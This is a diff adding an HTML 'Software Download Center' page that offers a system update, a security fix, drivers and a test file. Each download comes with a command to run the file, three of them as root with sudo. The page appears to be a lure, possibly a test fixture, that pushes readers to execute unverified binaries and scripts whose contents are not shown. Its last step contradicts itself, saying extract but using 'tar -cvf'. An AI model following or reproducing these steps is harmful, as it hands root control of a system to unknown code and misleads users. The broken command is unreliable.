@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Software Download Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+        h1 {
+            color: #0078D7;
+            font-weight: 700;
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
+            color: #333;
+        }
+        .file-list {
+            list-style: none;
+            padding: 0;
+        }
+        .file-list li {
+            margin: 20px 0;
+        }
+        .download-btn {
+            display: block;
+            background: #0078D7;
+            color: #fff;
+            padding: 12px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+            transition: background 0.3s ease-in-out;
+        }
+        .download-btn:hover {
+            background: #0056b3;
+        }
+        .instructions {
+            text-align: left;
+            font-size: 14px;
+            background: #f9f9f9;
+            padding: 10px;
+            border-left: 4px solid #0078D7;
+            margin-top: 10px;
+        }
+        .instructions code {
+            display: block;
+            background: #eaeaea;
+            padding: 5px;
+            border-radius: 5px;
+            margin-top: 5px;
+            font-size: 13px;
+        }
+        @media screen and (max-width: 600px) {
+            h1 {
+                font-size: 20px;
+            }
+            .container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Software Download Center</h1>
+        <p>Select a file to download and follow the installation instructions:</p>
+        <ul class="file-list">
+            <li>
+                <a href="update.bin" class="download-btn">Download System Update Patch</a>
+                <div class="instructions">
+                    <strong>Installation Steps:</strong>
+                    <p>After downloading, run the following command to install the update:</p>
+                    <code>sudo cp update.bin /usr/local/bin/ && chmod +x /usr/local/bin/update.bin && sudo /usr/local/bin/update.bin</code>
+                </div>
+            </li>
+            <li>
+                <a href="security_fix.tar.gz" class="download-btn">Download Security Fix (Recommended)</a>
+                <div class="instructions">
+                    <strong>Installation Steps:</strong>
+                    <p>Extract the fix and apply it using:</p>
+                    <code>tar -xzf security_fix.tar.gz -C /tmp/ && cd /tmp/security_fix/ && sudo ./install.sh</code>
+                </div>
+            </li>
+            <li>
+                <a href="drivers.sh" class="download-btn">Download Latest Drivers</a>
+                <div class="instructions">
+                    <strong>Installation Steps:</strong>
+                    <p>Make the script executable and run it:</p>
+                    <code>chmod +x drivers.sh && sudo ./drivers.sh</code>
+                </div>
+            </li>
+            <li>
+                <a href="test_file.tar" class="download-btn">Download Test File (For Linux Users)</a>
+                <div class="instructions">
+                    <strong>Installation Steps:</strong>
+                    <p>Extract the file and execute it:</p>
+                    <code>tar -cvf test_file.tar test_file && ./test_file</code>
+                </div>
+            </li>
+        </ul>
+    </div>
+</body>
+</html>
